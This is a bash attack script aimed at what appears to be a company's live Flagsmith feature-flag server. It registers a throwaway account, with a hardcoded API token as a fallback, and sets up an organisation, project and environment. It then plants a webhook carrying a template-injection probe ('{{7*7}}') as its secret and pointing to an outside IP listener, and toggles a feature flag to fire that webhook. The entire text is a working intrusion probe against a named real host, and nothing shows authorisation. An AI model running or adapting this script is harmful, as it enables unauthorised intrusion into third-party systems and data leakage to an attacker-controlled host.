#!/bin/bash
UA="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"

# Register fresh 
ACCT=$(curl -s -X POST "https://flagsmith.koinworks.com/api/v1/auth/users/" \
  -H "Content-Type: application/json" -H "User-Agent: $UA" \
  -d "{\"email\":\"kw-v29-$(date +%s)@proton.me\",\"password\":\"Hy7Nm3Qw9Rx!\",\"first_name\":\"T\",\"last_name\":\"S\"}" --max-time 15)
KEY=$(echo "$ACCT" | python3 -c "import json,sys; print(json.load(sys.stdin).get('key',''))" 2>/dev/null)
echo "Key: $KEY"
if [ -z "$KEY" ]; then KEY="5da1b5ae6b74de3bbaee92e1e979e1ffd39c0d67"; echo "Fallback"; fi

# Get or create org
OID=$(curl -s "https://flagsmith.koinworks.com/api/v1/organisations/" \
  -H "Authorization: Token $KEY" -H "User-Agent: $UA" --max-time 10 | python3 -c "import json,sys; d=json.load(sys.stdin); r=d.get('results',[]); print(r[0]['id'] if r else '')" 2>/dev/null)
if [ -z "$OID" ]; then
  OID=$(curl -s -X POST "https://flagsmith.koinworks.com/api/v1/organisations/" \
    -H "Authorization: Token $KEY" -H "Content-Type: application/json" -H "User-Agent: $UA" \
    -d '{"name":"v29"}' --max-time 10 | python3 -c "import json,sys; print(json.load(sys.stdin).get('id',''))" 2>/dev/null)
fi
PID=$(curl -s -X POST "https://flagsmith.koinworks.com/api/v1/projects/" \
  -H "Authorization: Token $KEY" -H "Content-Type: application/json" -H "User-Agent: $UA" \
  -d "{\"name\":\"p\",\"organisation\":$OID}" --max-time 10 | python3 -c "import json,sys; print(json.load(sys.stdin).get('id',''))" 2>/dev/null)
EKEY=$(curl -s -X POST "https://flagsmith.koinworks.com/api/v1/environments/" \
  -H "Authorization: Token $KEY" -H "Content-Type: application/json" -H "User-Agent: $UA" \
  -d "{\"name\":\"e\",\"project\":$PID}" --max-time 10 | python3 -c "import json,sys; print(json.load(sys.stdin).get('api_key',''))" 2>/dev/null)
echo "Setup: $OID/$PID/$EKEY"

# Create webhook with custom secret (might be evaluated)
echo "=== CREATE WEBHOOK WITH SECRET ==="
curl -s -X POST "https://flagsmith.koinworks.com/api/v1/environments/${EKEY}/webhooks/" \
  -H "Authorization: Token $KEY" -H "Content-Type: application/json" -H "User-Agent: $UA" \
  -d '{"url":"http://64.227.62.83:8892/webhook-ssti","enabled":true,"secret":"{{7*7}}"}' --max-time 10
echo ""

# Create feature flag to trigger webhook
echo "=== CREATE FEATURE ==="
curl -s -X POST "https://flagsmith.koinworks.com/api/v1/projects/${PID}/features/" \
  -H "Authorization: Token $KEY" -H "Content-Type: application/json" -H "User-Agent: $UA" \
  -d '{"name":"trigger_webhook","type":"FLAG","default_enabled":true}' --max-time 10
echo ""

# Toggle feature to fire webhook
echo "=== TOGGLE FEATURE ==="
# Get feature state ID
FS_ID=$(curl -s "https://flagsmith.koinworks.com/api/v1/environments/${EKEY}/featurestates/" \
  -H "Authorization: Token $KEY" -H "User-Agent: $UA" --max-time 10 | python3 -c "import json,sys; fs=json.load(sys.stdin).get('results',[]); print(fs[0]['id'] if fs else '')" 2>/dev/null)
echo "Feature State: $FS_ID"

if [ -n "$FS_ID" ]; then
  curl -s -X PATCH "https://flagsmith.koinworks.com/api/v1/environments/${EKEY}/featurestates/${FS_ID}/" \
    -H "Authorization: Token $KEY" -H "Content-Type: application/json" -H "User-Agent: $UA" \
    -d '{"enabled":false}' --max-time 10
  echo "Toggled to trigger webhook"
fi
